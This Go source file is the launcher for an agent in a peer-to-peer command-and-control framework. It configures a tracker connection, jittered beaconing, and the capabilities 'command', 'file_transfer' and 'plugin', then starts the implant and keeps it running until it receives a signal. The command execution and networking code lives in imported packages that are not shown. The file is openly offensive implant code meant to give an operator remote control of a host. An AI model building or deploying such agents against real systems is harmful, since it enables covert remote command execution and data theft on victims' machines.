package main

import (
	"flag"
	"log"
	"os"
	"os/signal"
	"p2p-c2-framework/agent"
	"p2p-c2-framework/util"
	"syscall"
	"time"
)

func main() {
	// Command line flags
	trackerAddr := flag.String("tracker", "127.0.0.1", "Tracker address")
	trackerPort := flag.Int("port", 8443, "Tracker port")
	trackerPeerID := flag.String("tracker-id", "", "Tracker peer ID (required)")
	beaconInterval := flag.Int("beacon", 60, "Beacon interval in seconds")
	jitter := flag.Int("jitter", 20, "Beacon jitter percentage")
	workDir := flag.String("workdir", "/tmp", "Working directory")
	tempDir := flag.String("tempdir", "/tmp", "Temporary directory")
	keyDir := flag.String("keydir", "./keys/agent", "Key directory")
	logLevel := flag.String("loglevel", "info", "Log level (debug, info, warn, error)")
	flag.Parse()

	// Validate required parameters
	if *trackerPeerID == "" {
		log.Fatal("Tracker peer ID is required. Use -tracker-id flag.")
	}

	// Set up logging
	switch *logLevel {
	case "debug":
		util.SetGlobalLogLevel(util.LogLevelDebug)
	case "info":
		util.SetGlobalLogLevel(util.LogLevelInfo)
	case "warn":
		util.SetGlobalLogLevel(util.LogLevelWarn)
	case "error":
		util.SetGlobalLogLevel(util.LogLevelError)
	default:
		util.SetGlobalLogLevel(util.LogLevelInfo)
	}

	logger := util.GetLogger("main")
	logger.Info("Starting P2P C2 Agent")

	// Create agent configuration
	config := &agent.AgentConfig{
		TrackerAddress:    *trackerAddr,
		TrackerPort:       *trackerPort,
		TrackerPeerID:     *trackerPeerID,
		BeaconInterval:    time.Duration(*beaconInterval) * time.Second,
		BeaconJitter:      *jitter,
		WorkingDirectory:  *workDir,
		TempDirectory:     *tempDir,
		KeyDirectory:      *keyDir,
		MaxTasksPerBeacon: 5,
		Capabilities:      []string{"command", "file_transfer", "plugin"},
	}

	// Create agent
	agentInstance, err := agent.NewAgent(config)
	if err != nil {
		log.Fatalf("Failed to create agent: %v", err)
	}

	logger.Info("Agent created with ID: %s", agentInstance.GetPeerID()[:16]+"...")

	// Start agent
	err = agentInstance.Start()
	if err != nil {
		log.Fatalf("Failed to start agent: %v", err)
	}

	logger.Info("Agent started successfully")

	// Set up signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// Wait for shutdown signal
	<-sigChan
	logger.Info("Received shutdown signal")

	// Stop agent
	agentInstance.Stop()
	logger.Info("Agent stopped")
}

